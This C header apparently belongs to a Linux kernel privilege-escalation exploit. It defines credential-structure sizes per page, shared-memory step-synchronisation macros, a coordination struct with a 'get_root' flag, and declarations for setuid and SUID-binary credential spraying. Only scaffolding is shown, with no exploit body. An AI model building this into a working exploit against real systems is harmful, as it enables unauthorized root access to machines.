#ifndef MOD_CRED_H
#define MOD_CRED_H

#include <stddef.h>

#define PAGE_SIZE 4096
#define CRED_SIZE 192
#define CRED_PERPAGE 21

#define DO_STEP(x, y) \
    x->y = 1

#define STEP_DONE(x, y) \
    x->y++

#define WAIT_STEP(x, y) \
    while(!x->y) usleep(1000)

#define WAIT_STEP_END(x, y, z) \
    while(x->y < z) usleep(1000)

struct cred_shm {
    int alloc_creds;
    int alloc_creds_done;
    int drop_usage;
    int drop_usage_done;
    int run_suid;
    int run_suid_done;
    int get_root;
};

void suid_binary_spray(char *name, size_t count);

void setuid_spray(size_t count, int swap);

struct cred_shm *init_setuid(void);

#endif